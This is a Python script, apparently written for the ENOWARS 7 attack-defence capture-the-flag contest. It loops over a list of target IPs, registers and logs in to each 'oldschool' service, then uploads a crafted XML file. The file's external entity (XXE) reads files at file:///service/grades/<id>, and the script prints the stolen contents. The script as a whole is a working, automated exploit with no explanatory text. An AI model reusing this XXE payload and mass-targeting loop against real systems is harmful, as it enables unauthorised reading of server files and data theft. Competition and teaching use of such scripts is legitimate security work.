import json
import requests
import string
import random
from bs4 import BeautifulSoup
import re
import sys

IP = open("ips", "r").readlines()
attackJson = "https://7.enowars.com/scoreboard/attack.json"

download = requests.get(attackJson)
output = json.loads(download.text)
	
def register(target, username, password, session):
	endpoint = target+"/index.php?action=register"
	data = {"username":username,"password":password}
	req = session.post(endpoint, data=data)
	# print("Success Register") if "Hello" not in req.text else print("Gagal")

def login(target, username, password, session):
	# Login
	endpoint = target+"/index.php?action=login"
	data = {"username":username,"password":password}
	req = session.post(endpoint, data=data)
	# print("Success Login") if "Hello" in req.text else print("Gagal")

def courses(target, flag, session):
	# POST Courses
	endpointCourses = target+"/index.php?action=courses"
	xml = f"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE data [ <!ENTITY file SYSTEM 'file:///service/grades/{flag}'> ]><data><course><name>aaa</name><description>&file;</description></course></data>"
	headers = {"Content-Type": "multipart/form-data"}
	files = {"course_data": ("tes.xml", xml.encode())}
	data = {"title":"randomrandom"}
	postCourse = session.post(endpointCourses, data=data, files=files)

	# Regex Flag
	pattern = r"<description>(.*?)<\/description>"
	match = re.search(pattern, postCourse.text)
	description = match.group(1)
	return description

username = sys.argv[1]
password = sys.argv[2]

for ip in IP:
	ip = ip.split("\n")[0]

	target = f"http://{ip}:9080"
	session = requests.Session()
	try:
		flag = output["services"]["oldschool"][str(ip)]
		start = str(flag)[2:5]
		end = int(start) + 20
		register(target, username, password, session)
	except:
		continue
	print(ip)		
	for i in range(int(start)-1,end):
		try:
			login(target, username, password, session)
			flag = output["services"]["oldschool"][str(ip)][str(i)]["1"][0].split()[-1]
			realFlag = courses(target, flag, session)
			print(realFlag)
		except:
			continue
